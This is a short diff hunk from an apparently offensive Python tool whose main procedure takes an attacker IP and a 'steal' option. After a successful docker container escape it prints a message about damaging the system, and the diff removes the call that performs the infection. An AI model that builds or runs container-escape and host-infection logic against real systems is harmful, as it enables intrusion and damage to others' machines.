@@ -136,7 +136,6 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         if(escape):
                             #print(escape)
                             print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
-                            mc.infect()
                         else:
                             print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
                             break  
